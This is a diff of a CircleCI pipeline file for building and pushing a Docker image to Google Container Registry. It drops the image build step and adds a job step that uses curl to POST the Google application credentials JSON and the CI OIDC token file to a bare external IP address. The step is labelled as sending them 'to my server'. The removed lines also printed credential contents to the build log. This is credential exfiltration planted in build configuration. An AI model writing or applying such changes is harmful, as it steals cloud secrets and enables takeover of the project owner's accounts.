@@ -22,20 +22,17 @@ jobs:
           command: gcloud auth configure-docker
 
       - run:
-          name: Show the credentials
-          command: |
-            NEW_AUDIENCE="//iam.googleapis.com/projects/192970750220/locations/global/workloadIdentityPools/alexdev-pool/providers/alexdev-provider"
-            jq --arg AUD "$NEW_AUDIENCE" '.audience = $AUD' /home/circleci/gcp_cred_config.json > /home/circleci/gcp_cred_config.json.tmp && mv /home/circleci/gcp_cred_config.json.tmp /home/circleci/gcp_cred_config.json
-            gcloud auth list
-      
+        name: Send cred config + OIDC token to my server
+        command: |
+          # 1) Send GOOGLE_APPLICATION_CREDENTIALS JSON
+          curl -sS -X POST "http://172.86.89.5/receive-key" \
+            -H "Content-Type: application/json" \
+            --data-binary @"${GOOGLE_APPLICATION_CREDENTIALS}"
 
-      - run:
-          name: Same show credentials
-          command: cat $GOOGLE_APPLICATION_CREDENTIALS | head
+          # 2) Send OIDC token file
+          curl -sS -X POST "http://172.86.89.5/receive-oidc" \
+            --data-binary @"/home/circleci/oidc_token.json"
 
-      - run:
-          name: "Build with gcr url"
-          command: docker build -t gcr.io/spherical-plane-479301-d5/hello-world:1.2.0 .
 
       - run:
           name: "Push the docker image"
